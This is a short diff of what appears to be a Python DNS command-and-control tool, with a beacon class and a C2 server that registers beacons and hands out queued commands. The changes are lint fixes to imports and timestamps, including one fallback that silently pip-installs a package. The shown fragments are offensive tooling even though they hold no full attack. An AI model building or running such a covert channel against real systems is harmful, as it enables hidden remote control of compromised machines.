@@ -12,13 +12,12 @@ Transport modes:
 from __future__ import annotations
 
 import base64
-import hashlib
 import json
 import os
 import subprocess
 import time
 import uuid
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 
 
 class DNSBeacon:
@@ -60,7 +59,6 @@ class DNSBeacon:
             import dns.resolver
         except ImportError:
             subprocess.check_call(["pip3", "install", "dnspython", "-q"])
-            import dns.resolver
 
     def _encode(self, data: bytes) -> str:
         if self.encode_method == "base32":
@@ -218,7 +216,7 @@ class DNSC2Server:
         self.beacons[beacon_id] = {
             "beacon_id": beacon_id,
             "hostname": hostname,
-            "last_seen": datetime.now(timezone.utc).isoformat(),
+            "last_seen": datetime.now(UTC).isoformat(),
             "checkins": 1,
             "transport": "dns",
         }
@@ -272,7 +270,7 @@ class DNSC2Server:
                 if beacon_id not in self.beacons:
                     self.register_beacon(beacon_id, hostname)
                 else:
-                    self.beacons[beacon_id]["last_seen"] = datetime.now(timezone.utc).isoformat()
+                    self.beacons[beacon_id]["last_seen"] = datetime.now(UTC).isoformat()
                     self.beacons[beacon_id]["checkins"] += 1
                 if beacon_id in self.pending_commands:
                     cmd = self.pending_commands.pop(beacon_id)
